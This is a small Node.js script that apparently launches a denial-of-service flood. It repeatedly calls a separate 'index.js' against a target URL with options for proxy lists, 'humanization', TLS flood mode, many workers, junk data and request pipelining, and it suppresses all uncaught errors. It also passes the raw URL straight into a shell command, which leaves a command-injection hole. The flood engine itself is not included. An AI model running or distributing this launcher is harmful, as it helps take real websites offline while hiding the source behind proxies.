const execSync = require('child_process').execSync;
var thread = process.argv[3]
var url = process.argv[2]

function get() {
    for (x = 0; x < thread; x++) {
        execSync(`node index.js "${url}" --humanization true --mode tlsfl --precheck false --proxy proxies.txt --time 3000 --pool 20 --uptime 15000 --workers 50 --proxylen 21000 --delay 10000 --junk true --pipe 500`)
    }
}
get()

process.on('uncaughtException', function() {});
process.on('unhandledRejection', function() {});